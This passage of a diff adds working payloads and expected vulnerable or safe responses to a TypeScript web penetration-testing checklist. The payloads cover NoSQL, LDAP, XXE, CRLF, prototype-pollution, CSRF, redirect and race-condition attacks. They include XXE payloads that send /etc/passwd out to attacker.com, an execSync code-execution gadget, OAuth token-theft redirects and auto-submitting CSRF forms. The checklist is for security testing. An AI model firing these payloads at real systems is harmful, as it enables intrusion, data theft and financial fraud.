+          vulnerable: "A $where clause with injected JavaScript executes server-side (e.g. via sleep() equivalent or data exfiltration), confirming server-side JS injection.",
+          safe: "$where/JavaScript execution is disabled server-side, or user input cannot reach a $where context.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-nosql-6",
         text: "Test NoSQLi in search/filter query parameters",
         how: "Free-text search fields backed by NoSQL are often unfiltered — test operator injection there too.",
+        payloads: ["?search[$ne]=null", "?filter={\"$where\":\"sleep(3000)\"}"],
+        expectedResponse: {
+          vulnerable: "Operator injection in search/filter parameters returns results outside the intended filter scope (e.g. all records instead of matching ones).",
+          safe: "Search/filter parameters are strictly typed and operator injection has no effect on the result set.",
+        },
         severity: "medium",
       },
     ],
@@ -1322,6 +2111,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test LDAP injection with wildcard in login forms",
         how: "Insert wildcard characters into username fields backed by LDAP authentication to check for filter manipulation.",
         payloads: ["*"],
+        expectedResponse: {
+          vulnerable: "A wildcard payload (e.g. \"*)(uid=*))(|(uid=*\") in the login form bypasses the LDAP filter and authenticates without valid credentials.",
+          safe: "LDAP special characters are escaped before being placed into the filter, and wildcard payloads fail to authenticate.",
+        },
         severity: "high",
       },
       {
@@ -1329,24 +2122,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test LDAP authentication bypass",
         how: "Craft a filter-breaking payload aiming to make the LDAP query always evaluate true.",
         payloads: [")(cn=*))(|(cn=*"],
+        expectedResponse: {
+          vulnerable: "A crafted filter injection (e.g. always-true condition) bypasses LDAP authentication entirely.",
+          safe: "LDAP bind fails for any crafted filter injection attempt; only valid credentials authenticate.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-ldap-3",
         text: "Test blind LDAP injection for data extraction",
         how: "Use boolean-style LDAP filter payloads and compare application responses to extract directory attributes.",
+        payloads: ["*)(uid=admin*))(|(uid=*", "*)(mail=a*"],
+        expectedResponse: {
+          vulnerable: "Boolean-style LDAP filter injections produce observably different responses, allowing blind extraction of directory data.",
+          safe: "Responses are identical regardless of the injected boolean condition, indicating no blind LDAP injection point.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-ldap-4",
         text: "Test LDAP injection in directory search features",
         how: "Target employee/user search functionality backed by LDAP with filter-breaking input.",
+        payloads: ["*)(department=*))(|(cn=*"],
+        expectedResponse: {
+          vulnerable: "Directory search features return unintended/expanded results when filter metacharacters are injected.",
+          safe: "Directory search input is escaped and injected metacharacters have no effect on search scope.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-ldap-5",
         text: "Test LDAP special character filtering completeness",
         how: "Verify the app escapes all LDAP-significant characters (*, (, ), \\, NUL), not just a subset.",
+        payloads: ["(", ")", "\\", "\\0", "*"],
+        expectedResponse: {
+          vulnerable: "Only some LDAP special characters are filtered, and an unfiltered one (e.g. a specific escape sequence) still enables injection.",
+          safe: "All LDAP special characters (*, (, ), \\, NUL, etc.) are consistently escaped, leaving no bypassable characters.",
+        },
         severity: "medium",
       },
     ],
@@ -1362,18 +2174,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for XML External Entity (XXE) injection",
         how: "Submit an XML body defining an external entity referencing a local file and check if it's resolved in the response.",
         payloads: ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"],
+        expectedResponse: {
+          vulnerable: "A DOCTYPE with an external entity resolves and its content (e.g. /etc/passwd) is reflected in the response.",
+          safe: "External entity resolution is disabled by the XML parser, and the entity reference is ignored or causes a parse error.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-xxe-2",
         text: "Test blind XXE via out-of-band exfiltration",
         how: "Use an external DTD hosted on your server to exfiltrate file contents when no direct response reflection occurs.",
+        payloads: ["<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>", "// evil.dtd: <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil;"],
+        expectedResponse: {
+          vulnerable: "No data is reflected directly, but an out-of-band DNS/HTTP callback confirms the external entity was resolved server-side.",
+          safe: "No out-of-band callback is received, confirming external entities are not resolved.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-xxe-3",
         text: "Test XXE via file upload (SVG/DOCX/XLSX)",
         how: "Office and image formats are XML-based containers — embed an XXE payload inside an uploaded SVG/DOCX and check for processing.",
+        payloads: ["<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"],
+        expectedResponse: {
+          vulnerable: "An uploaded SVG/DOCX/XLSX (which embed XML) triggers external entity resolution when processed/rendered by the server.",
+          safe: "The document parser used for uploaded office/image formats disables external entity resolution.",
+        },
         severity: "critical",
       },
       {
@@ -1381,24 +2207,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test XXE-based SSRF",
         how: "Define an external entity pointing to an internal URL instead of a file, using XXE purely to pivot into SSRF.",
         payloads: ["<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">"],
+        expectedResponse: {
+          vulnerable: "An XXE payload causes the server to make an outbound request to an internal/attacker-controlled URL via the entity definition.",
+          safe: "The XML parser blocks external entity-driven network requests, preventing SSRF via XXE.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-xxe-5",
         text: "Test billion laughs / entity expansion DoS",
         how: "Submit nested entity definitions that expand exponentially to test for XML parser resource exhaustion.",
+        payloads: ["<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>"],
+        expectedResponse: {
+          vulnerable: "A billion-laughs payload causes excessive memory/CPU consumption or a crash/hang, confirming a DoS via entity expansion.",
+          safe: "The parser enforces entity expansion limits and rejects or safely handles the payload without resource exhaustion.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-xxe-6",
         text: "Test XXE in SOAP API endpoints",
         how: "SOAP services parse XML server-side by design — test the same XXE payloads against SOAP request bodies.",
+        payloads: ["<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>&xxe;</soap:Body></soap:Envelope>"],
+        expectedResponse: {
+          vulnerable: "The SOAP endpoint's XML parser resolves external entities, exposing local files or making outbound requests.",
+          safe: "The SOAP parser has external entity resolution disabled and rejects DOCTYPE declarations.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-xxe-7",
         text: "Test parameter entity XXE bypass when direct entities are blocked",
         how: "If direct ENTITY declarations are stripped/blocked, try parameter entities (%) which some filters miss.",
+        payloads: ["<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>"],
+        expectedResponse: {
+          vulnerable: "A parameter entity payload bypasses a filter that only blocked general/direct entity declarations, still achieving exfiltration.",
+          safe: "Parameter entities are also blocked/disabled, so the bypass technique fails to achieve exfiltration.",
+        },
         severity: "high",
       },
     ],
@@ -1414,6 +2259,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for CRLF injection in URL parameters",
         how: "Inject encoded CR/LF sequences into reflected parameters to attempt HTTP response splitting.",
         payloads: ["%0d%0aSet-Cookie:%20injected=true"],
+        expectedResponse: {
+          vulnerable: "A %0d%0a sequence in a URL parameter injects additional headers or splits the HTTP response.",
+          safe: "CRLF sequences are stripped/encoded before being placed into headers, and no header injection occurs.",
+        },
         severity: "high",
       },
       {
@@ -1421,24 +2270,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test CRLF injection in HTTP headers built from user input",
         how: "Check parameters echoed into response headers (e.g. Location) for header injection.",
         payloads: ["%0d%0aX-Injected: true"],
+        expectedResponse: {
+          vulnerable: "User input used to build a response header allows injecting arbitrary additional headers (e.g. Set-Cookie, cache headers).",
+          safe: "Header-building code rejects or encodes CR/LF characters, preventing extra header injection.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-crlf-3",
         text: "Test CRLF-to-XSS via response splitting",
         how: "Chain CRLF injection with an injected body to smuggle a reflected XSS payload past output encoding on the main content.",
+        payloads: ["%0d%0a%0d%0a<script>alert(document.domain)</script>"],
+        expectedResponse: {
+          vulnerable: "Response splitting via CRLF injection allows injecting a full HTML body, resulting in reflected XSS.",
+          safe: "CRLF injection is blocked at the header layer, so response splitting and the resulting XSS are not possible.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-crlf-4",
         text: "Test CRLF injection in log-writing parameters (log injection)",
         how: "Inject newlines into values that get written to server logs to forge fake log entries.",
+        payloads: ["curl -A 'Mozilla/5.0%0d%0a[FAKE] admin login success from 10.0.0.1' https://example.com/"],
+        expectedResponse: {
+          vulnerable: "CRLF characters in logged input create fake/forged log entries, enabling log injection or log-viewer XSS.",
+          safe: "CRLF characters are stripped/escaped before being written to logs, preventing forged entries.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-crlf-5",
         text: "Test CRLF injection in SMTP header parameters",
         how: "If user input reaches email header construction (To/Subject), test for header injection enabling spam relay.",
+        payloads: ["subject=Hello%0ABcc:victim1@example.com,victim2@example.com"],
+        expectedResponse: {
+          vulnerable: "CRLF injection into SMTP headers (e.g. via a \"name\" field used in a From/To header) allows adding extra recipients or headers (email header injection).",
+          safe: "SMTP header-building code sanitizes CR/LF from user input, preventing extra header/recipient injection.",
+        },
         severity: "high",
       },
     ],
@@ -1454,6 +2322,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test open redirect in redirect/return-url parameters",
         how: "Set redirect-style parameters to an external domain and confirm the app redirects without validation.",
         payloads: ["?redirect=https://evil.com", "?next=//evil.com"],
+        expectedResponse: {
+          vulnerable: "An external URL supplied in the redirect/return-url parameter results in the browser being redirected to that arbitrary external site.",
+          safe: "The redirect parameter is validated against an allowlist of internal paths/domains, and external URLs are rejected or ignored.",
+        },
         severity: "medium",
       },
       {
@@ -1461,18 +2333,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test open redirect with protocol-relative URLs",
         how: "Protocol-relative URLs (//evil.com) often bypass naive 'starts with http' checks.",
         payloads: ["//evil.com", "/\\evil.com", "\\/\\/evil.com"],
+        expectedResponse: {
+          vulnerable: "A protocol-relative URL (e.g. //evil.com) is accepted and redirects to the external domain.",
+          safe: "Protocol-relative URLs are recognized and rejected/normalized to an internal path, preventing external redirection.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-redirect-3",
         text: "Test open redirect bypass via allowlist trick",
         how: "If the app allowlists its own domain, try embedding the trusted domain as a subpath/subdomain of the attacker's (example.com.evil.com or evil.com/example.com).",
+        payloads: ["?redirect=https://example.com.evil.com", "?redirect=https://evil.com/example.com", "?redirect=https://evil.com?example.com"],
+        expectedResponse: {
+          vulnerable: "A crafted URL that appears to match the allowlist (e.g. trusted.com.evil.com or trusted.com@evil.com) still redirects to the attacker's domain.",
+          safe: "The allowlist check correctly parses the URL's actual host and rejects lookalike/bypass domains.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-redirect-4",
         text: "Test open redirect chained into OAuth token theft",
         how: "Combine a confirmed open redirect with the OAuth redirect_uri flow to steal authorization codes/tokens.",
+        payloads: ["https://example.com/oauth/authorize?client_id=xyz&response_type=token&redirect_uri=https://example.com/redirect?next=https://attacker.com"],
+        expectedResponse: {
+          vulnerable: "The open redirect is used within the OAuth flow's redirect_uri to leak the authorization code/token to an attacker-controlled domain.",
+          safe: "The OAuth flow uses strict exact-match redirect_uri validation, so the open redirect cannot be leveraged to steal tokens.",
+        },
         severity: "high",
         tags: { relatedItemIds: ["web-auth-oauth-1"] },
       },
@@ -1489,6 +2375,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test client-side prototype pollution via __proto__",
         how: "Inject __proto__-based keys into URL/query parameters parsed by vulnerable JS merge/clone utilities and observe global object pollution.",
         payloads: ["?__proto__[polluted]=true"],
+        expectedResponse: {
+          vulnerable: "A __proto__-based payload pollutes Object.prototype client-side, altering application behavior or enabling DOM XSS.",
+          safe: "The merge/assignment logic blocks __proto__/constructor/prototype keys, and no pollution occurs.",
+        },
         severity: "medium",
       },
       {
@@ -1496,18 +2386,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test server-side prototype pollution in Node.js",
         how: "Submit JSON bodies with __proto__ or constructor.prototype keys to endpoints doing recursive merge without sanitization.",
         payloads: ["{\"__proto__\":{\"isAdmin\":true}}"],
+        expectedResponse: {
+          vulnerable: "A __proto__ payload in a Node.js request body pollutes the global Object.prototype, observable via altered behavior in a later request.",
+          safe: "The server-side merge library sanitizes or blocks dangerous keys (__proto__, constructor.prototype), preventing pollution.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-proto-3",
         text: "Test prototype pollution to RCE gadget chains",
         how: "If server-side pollution is confirmed, check for known gadget chains in libraries used (e.g. via lodash/ejs) that escalate pollution to code execution.",
+        payloads: ["{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');x\"}}"],
+        expectedResponse: {
+          vulnerable: "Polluted prototype properties are leveraged through a gadget (e.g. a template engine or child_process option) to achieve remote code execution.",
+          safe: "No exploitable gadget chain exists, or the pollution itself is blocked, so RCE is not achievable via this path.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-proto-4",
         text: "Test prototype pollution to DOM XSS gadget",
         how: "Check if client-side pollution reaches a template engine or DOM sink that turns polluted properties into script execution.",
+        payloads: ["?__proto__[srcdoc]=<img src=x onerror=alert(1)>", "?__proto__[data-testid]=x onmouseover=alert(1)"],
+        expectedResponse: {
+          vulnerable: "Polluted properties are read by client-side code and used in a DOM sink, resulting in script execution.",
+          safe: "No client-side sink reads the polluted properties in an unsafe way, or pollution is blocked outright.",
+        },
         severity: "high",
       },
     ],
@@ -1523,6 +2427,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test HPP by duplicating a parameter with conflicting values",
         how: "Send the same parameter name twice with different values and observe which one the backend uses vs. any WAF/validation layer in front — a mismatch can bypass filtering.",
         payloads: ["?id=1&id=2"],
+        expectedResponse: {
+          vulnerable: "Sending a parameter twice with conflicting values causes the server/framework to use an unexpected one (e.g. the first instead of last), altering logic (e.g. bypassing a check).",
+          safe: "Duplicate parameters are handled consistently and predictably with no exploitable behavior change.",
+        },
         severity: "medium",
       },
       {
@@ -1530,18 +2438,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test HPP to bypass input validation on a specific field",
         how: "If a single-value check validates only the first/last occurrence, smuggle a malicious second value past it depending on server parsing order.",
         payloads: ["?amount=10&amount=-1000"],
+        expectedResponse: {
+          vulnerable: "Duplicating a validated parameter allows the second, unvalidated occurrence to be the one actually used by the backend, bypassing validation.",
+          safe: "Validation is applied to the same parameter instance actually used by the backend, regardless of duplication.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-hpp-3",
         text: "Test HPP impact on server-side request construction (SSRF/redirect targets)",
         how: "Check if duplicating a URL-bearing parameter causes the backend to use an unexpected value when building an outbound request or redirect.",
+        payloads: ["?url=https://trusted.com&url=http://169.254.169.254/latest/meta-data/", "?redirect=https://example.com&redirect=https://evil.com"],
+        expectedResponse: {
+          vulnerable: "Duplicate parameters cause the server to build an internal request (SSRF target, redirect URL) using an attacker-controlled second value.",
+          safe: "The server consistently uses a single, validated value for building internal requests, ignoring duplicates.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-hpp-4",
         text: "Test HPP across query string vs body for the same parameter name",
         how: "Send the parameter once in the query string and once in the POST body, and check which source the framework prioritizes — this can bypass checks applied to only one.",
+        payloads: ["curl -X POST 'https://example.com/transfer?amount=1' -d 'amount=100000'"],
+        expectedResponse: {
+          vulnerable: "The same parameter name is treated differently between query string and body, allowing one channel to smuggle a value past validation applied to the other.",
+          safe: "Query string and body values for the same parameter name are handled consistently, with no smuggling opportunity.",
+        },
         severity: "medium",
       },
     ],
@@ -1557,24 +2479,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test SMTP command injection via email-sending features",
         how: "Inject newline-separated SMTP commands into a field (To/CC/Subject/body) that gets passed to an SMTP library, to attempt additional command execution or recipient injection.",
         payloads: ["victim@example.com%0ABCC:attacker@evil.com"],
+        expectedResponse: {
+          vulnerable: "SMTP command sequences injected via an email-sending feature are executed by the mail server (e.g. adding headers or commands).",
+          safe: "Input passed to the mail-sending feature is sanitized against SMTP command injection.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-mail-2",
         text: "Test IMAP injection in webmail search/filter features",
         how: "If the app exposes IMAP-backed search/filter functionality, inject IMAP command syntax to manipulate the underlying query.",
+        payloads: ["a1 SEARCH \" BODY \"password\"", "test\" BODY \"secret"],
+        expectedResponse: {
+          vulnerable: "IMAP injection in webmail search/filter returns unintended mailbox data or manipulates the IMAP command.",
+          safe: "IMAP command-building code escapes user input, preventing command injection.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-mail-3",
         text: "Test email-sending feature for open relay / spam abuse",
         how: "Check if a contact-form or invite-a-friend feature can be abused to send arbitrary content to arbitrary recipients, turning the app into a spam relay.",
+        payloads: ["curl -X POST https://example.com/invite -d 'to=victim1@test.com,victim2@test.com&message=spam+content'"],
+        expectedResponse: {
+          vulnerable: "The email feature can be abused to send mail to arbitrary external recipients (open relay/spam), confirming lack of recipient restriction.",
+          safe: "The email feature restricts recipients (e.g. only the account owner) and rejects arbitrary external recipients.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-mail-4",
         text: "Test for template injection in outbound email content",
         how: "Check whether user-controlled input reaching an email template is rendered through the same template engine used elsewhere, opening an SSTI path via email features.",
+        payloads: ["curl -X POST https://example.com/api/profile -d 'displayName={{7*7}}' # then trigger a welcome/notification email"],
+        expectedResponse: {
+          vulnerable: "A template injection payload in outbound email content is evaluated server-side, appearing as executed output in the sent email.",
+          safe: "Template expressions in email content are rendered as literal text with no server-side evaluation.",
+        },
         severity: "high",
         tags: { relatedItemIds: ["web-inject-ssti-1"] },
       },
@@ -1592,6 +2533,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-biz-logic-1",
         text: "Test for price manipulation in checkout flow",
         how: "Intercept and modify the price/amount field in the checkout request before it reaches the payment step.",
+        payloads: ["{\"itemId\":101,\"price\":0.01}", "{\"itemId\":101,\"price\":-50}"],
+        expectedResponse: {
+          vulnerable: "Manipulating the price parameter in the checkout request results in an order being placed at the attacker-controlled (lower) price.",
+          safe: "The server recalculates/validates price server-side from the product catalog, ignoring any client-supplied price.",
+        },
         severity: "critical",
       },
       {
@@ -1599,42 +2545,76 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for quantity manipulation (negative/zero)",
         how: "Submit negative or zero quantities in cart/order requests to see if totals are recalculated incorrectly (e.g. negative total, free items).",
         payloads: ["quantity=-1", "quantity=0"],
+        expectedResponse: {
+          vulnerable: "A negative or zero quantity is accepted, resulting in a credited balance, free items, or negative total.",
+          safe: "Quantity is validated to be a positive integer within sensible bounds, and negative/zero values are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-biz-logic-3",
         text: "Test for coupon/discount stacking abuse",
         how: "Apply the same or multiple discount codes repeatedly to check if the app prevents stacking beyond intended limits.",
+        payloads: ["curl -X POST https://example.com/cart/apply-coupon -d 'code=SAVE10' # repeat multiple times or with SAVE10,SAVE20 together"],
+        expectedResponse: {
+          vulnerable: "Multiple coupons/discounts can be combined beyond intended limits, resulting in an unintended discount (e.g. over 100% off).",
+          safe: "The server enforces a single coupon or a validated maximum combined discount, rejecting stacking abuse.",
+        },
         severity: "medium",
       },
       {
         id: "web-biz-logic-4",
         text: "Test workflow step skipping",
         how: "Directly call a later step's API/endpoint in a multi-step process (e.g. payment confirmation) without completing prior steps.",
+        payloads: ["curl -X POST https://example.com/api/checkout/confirm -d '{\"orderId\":123}'  # skip /cart and /payment steps"],
+        expectedResponse: {
+          vulnerable: "A later step in a multi-step workflow can be reached directly, skipping required validation/payment steps.",
+          safe: "The server enforces step order server-side and rejects requests for later steps if prior steps aren't completed.",
+        },
         severity: "high",
       },
       {
         id: "web-biz-logic-5",
         text: "Test for currency confusion in pricing logic",
         how: "Switch currency parameters mid-transaction to see if the app applies the wrong exchange rate or charges the wrong amount.",
+        payloads: ["{\"amount\":100,\"currency\":\"USD\"} -> intercept and change to {\"amount\":100,\"currency\":\"JPY\"} at the charge step"],
+        expectedResponse: {
+          vulnerable: "Switching currency mid-transaction results in a mismatched price being charged (e.g. paying a small amount in one currency for an item priced in another).",
+          safe: "The server recalculates and locks the price in the correct currency server-side regardless of currency-switch timing.",
+        },
         severity: "high",
       },
       {
         id: "web-biz-logic-6",
         text: "Test for negative balance / wallet manipulation",
         how: "Attempt transactions that would drive an account balance negative and check if server-side limits enforce a floor.",
+        payloads: ["curl -X POST https://example.com/api/wallet/withdraw -d '{\"amount\":999999}' -H 'Content-Type: application/json'  # balance is 100"],
+        expectedResponse: {
+          vulnerable: "A wallet/balance operation can be manipulated to go negative or be credited without a corresponding valid transaction.",
+          safe: "Balance operations are validated and atomic server-side, preventing negative balances or unearned credits.",
+        },
         severity: "critical",
       },
       {
         id: "web-biz-logic-7",
         text: "Test referral/reward abuse via self-referral",
         how: "Check if a user can refer themselves (multiple accounts, same device/payment) to farm referral bonuses.",
+        payloads: ["curl -X POST https://example.com/register -d 'email=user+1@test.com&referral=OWNCODE123'", "curl -X POST https://example.com/register -d 'email=user+2@test.com&referral=OWNCODE123'"],
+        expectedResponse: {
+          vulnerable: "A user can refer themselves (via a second account/email alias) and receive the referral reward.",
+          safe: "The system detects and blocks self-referral (e.g. via device/IP/payment fingerprinting or verification checks).",
+        },
         severity: "medium",
       },
       {
         id: "web-biz-logic-8",
         text: "Test for logic flaws in free-trial abuse",
         how: "Check if free trials can be repeated indefinitely by cycling emails/payment tokens without real restriction.",
+        payloads: ["curl -X POST https://example.com/trial/start -d 'email=user+trial1@test.com'", "curl -X POST https://example.com/trial/start -d 'email=user+trial2@test.com'"],
+        expectedResponse: {
+          vulnerable: "The free trial can be repeatedly claimed by the same user/device (e.g. via new email/card combos) beyond the intended one-time use.",
+          safe: "The system enforces one trial per user/device/payment method via robust fingerprinting or verification.",
+        },
         severity: "low",
       },
     ],
@@ -1649,36 +2629,66 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-biz-race-1",
         text: "Test race condition in balance/coupon redemption",
         how: "Send many identical requests concurrently (Turbo Intruder / burp repeater group) to see if a limit-checked action can be duplicated.",
+        payloads: ["# Burp Turbo Intruder race.py: engine=RequestEngine(endpoint=target, concurrentConnections=20); for i in range(20): engine.queue(target.req, gate='race1'); engine.openGate('race1')"],
+        expectedResponse: {
+          vulnerable: "Sending concurrent requests to redeem a balance/coupon results in it being applied/redeemed multiple times.",
+          safe: "Concurrent requests are serialized/locked server-side, and only a single redemption succeeds; others are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-biz-race-2",
         text: "Test race condition in single-use voucher/promo codes",
         how: "Redeem the same one-time code from parallel requests to check if it can be applied more than once.",
+        payloads: ["for i in {1..20}; do curl -X POST https://example.com/redeem -d 'code=PROMO2024' & done; wait"],
+        expectedResponse: {
+          vulnerable: "A single-use voucher/promo code is successfully applied more than once when redeemed concurrently.",
+          safe: "The voucher is atomically marked as used, so only the first of the concurrent requests succeeds.",
+        },
         severity: "high",
       },
       {
         id: "web-biz-race-3",
         text: "Test race condition in withdrawal/transfer endpoints",
         how: "Fire concurrent withdrawal requests exceeding the available balance to check for a TOCTOU flaw in balance checks.",
+        payloads: ["for i in {1..10}; do curl -X POST https://example.com/api/withdraw -d '{\"amount\":100}' -H 'Content-Type: application/json' & done; wait  # balance is only 100"],
+        expectedResponse: {
+          vulnerable: "Concurrent withdrawal/transfer requests both succeed, resulting in more funds withdrawn/transferred than the account balance allows.",
+          safe: "Withdrawal/transfer operations use atomic balance checks/locks, so concurrent requests cannot both succeed beyond the available balance.",
+        },
         severity: "critical",
       },
       {
         id: "web-biz-race-4",
         text: "Test race condition in account creation/username claiming",
         how: "Attempt to register the same unique username/email from parallel requests to see if duplicate accounts get created.",
+        payloads: ["for i in {1..10}; do curl -X POST https://example.com/register -d 'username=coveted_name&email=test'$i'@test.com' & done; wait"],
+        expectedResponse: {
+          vulnerable: "Concurrent account-creation requests both succeed in claiming the same unique username/handle.",
+          safe: "Username uniqueness is enforced atomically (e.g. via a unique DB constraint), so only one concurrent request succeeds.",
+        },
         severity: "medium",
       },
       {
         id: "web-biz-race-5",
         text: "Test race condition in rate-limit counters",
         how: "Send a burst of concurrent requests to see if the rate limiter's check-then-increment logic can be exceeded.",
+        payloads: ["for i in {1..50}; do curl -X POST https://example.com/api/action & done; wait  # limit is stated as 10/min"],
+        expectedResponse: {
+          vulnerable: "Sending many concurrent requests exceeds the intended rate limit because the counter isn't atomically updated.",
+          safe: "The rate-limit counter is atomically incremented/checked, so concurrent requests cannot exceed the configured limit.",
+        },
         severity: "medium",
       },
       {
         id: "web-biz-race-6",
         text: "Test multi-endpoint race condition (limit-overrun across two routes)",
         how: "Use requests to two different endpoints that both check/modify the same shared state, sent simultaneously.",
+        payloads: ["curl -X POST https://example.com/api/apply-coupon -d 'code=X' & curl -X POST https://example.com/api/checkout/finalize -d '{}' &  wait"],
+        expectedResponse: {
+          vulnerable: "Splitting requests across two related endpoints that share a limit allows the combined limit to be exceeded (e.g. two withdrawal routes not sharing one counter).",
+          safe: "The limit is enforced against a shared, atomic counter across all related endpoints, preventing cross-endpoint overrun.",
+        },
         severity: "high",
       },
     ],
@@ -1693,36 +2703,66 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-req-csrf-1",
         text: "Test state-changing requests without CSRF token",
         how: "Replay a POST/PUT/DELETE request with the CSRF token removed or reused from another session.",
+        payloads: ["curl -X POST -b 'session=<victim_token>' https://example.com/account/update -d 'email=attacker@evil.com'  # csrf_token field omitted"],
+        expectedResponse: {
+          vulnerable: "A state-changing request succeeds without any CSRF token, confirming the action can be forged from a third-party site.",
+          safe: "The request is rejected (403/400) when no valid CSRF token is present.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-csrf-2",
         text: "Test CSRF token validation strength (per-session vs per-request)",
         how: "Check if a token from one session/request is accepted for another, or if a blank/predictable token is accepted.",
+        payloads: ["curl -X POST -b 'session=<attacker_token>' https://example.com/account/update -d 'csrf_token=<attacker_own_csrf_token>&email=x'  # replay under victim session"],
+        expectedResponse: {
+          vulnerable: "The same CSRF token is valid across multiple sessions/requests (not tied to the specific session/request), weakening its protection.",
+          safe: "Each token is uniquely tied to the session (and ideally per-request) and reused/foreign tokens are rejected.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-csrf-3",
         text: "Test JSON-based endpoints for CSRF via form-based content-type tricks",
         how: "Check if a JSON API endpoint can be triggered via a simple HTML form using text/plain or multipart, bypassing the assumption that JSON needs JS/CORS.",
+        payloads: ["<form action=\"https://example.com/api/account/update\" method=\"POST\" enctype=\"text/plain\"><input name='{\"email\":\"a\",\"ignore\":\"' value='x\"}'></form>"],
+        expectedResponse: {
+          vulnerable: "Switching the content-type to a simple form type (bypassing preflight) still allows the JSON endpoint to process the forged request.",
+          safe: "The endpoint strictly validates content-type/requires a custom header not settable by simple forms, blocking the bypass.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-csrf-4",
         text: "Test CSRF on GET-based state-changing actions",
         how: "Check if any sensitive action (delete, unsubscribe) is triggerable via a simple GET request, exploitable via an <img> tag.",
+        payloads: ["<img src=\"https://example.com/account/delete?confirm=true\">", "<img src=\"https://example.com/unsubscribe?email=victim@example.com\">"],
+        expectedResponse: {
+          vulnerable: "A state-changing action can be triggered via a simple GET request (e.g. an <img> tag), confirming it's forgeable without any form submission.",
+          safe: "State-changing actions require POST/PUT/DELETE with a valid CSRF token; GET requests do not trigger any state change.",
+        },
         severity: "medium",
       },
       {
         id: "web-req-csrf-5",
         text: "Test CSRF on login (login CSRF)",
         how: "Forge a cross-site login request that logs the victim into an attacker-controlled account, useful for tracking or later chained attacks.",
+        payloads: ["<form action=\"https://example.com/login\" method=\"POST\" id=\"f\"><input name=\"user\" value=\"attacker\"><input name=\"pass\" value=\"AttackerPass1!\"></form><script>document.getElementById('f').submit()</script>"],
+        expectedResponse: {
+          vulnerable: "A forged cross-site login request succeeds in logging the victim into an attacker-controlled account (login CSRF).",
+          safe: "The login form requires a valid CSRF token or other anti-forgery protection, blocking forged cross-site login attempts.",
+        },
         severity: "low",
       },
       {
         id: "web-req-csrf-6",
         text: "Build and verify a working PoC HTML page for a confirmed CSRF",
         how: "Craft an auto-submitting HTML form for the vulnerable endpoint and confirm it executes in a fresh browser session with the victim's cookies.",
+        payloads: ["<html><body onload=\"document.forms[0].submit()\"><form action=\"https://example.com/account/email\" method=\"POST\"><input name=\"email\" value=\"attacker@evil.com\"></form></body></html>"],
+        expectedResponse: {
+          vulnerable: "The auto-submitting PoC HTML page, when visited while logged in, successfully performs the state-changing action on the victim's behalf.",
+          safe: "The PoC page's forged request is rejected by the server due to CSRF protections, and the action does not occur.",
+        },
         severity: "medium",
       },
     ],
@@ -1738,6 +2778,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test CORS with arbitrary Origin reflection",
         how: "Send a request with an attacker-controlled Origin header and check if it's reflected in Access-Control-Allow-Origin with credentials allowed.",
         payloads: ["Origin: https://evil.com"],
+        expectedResponse: {
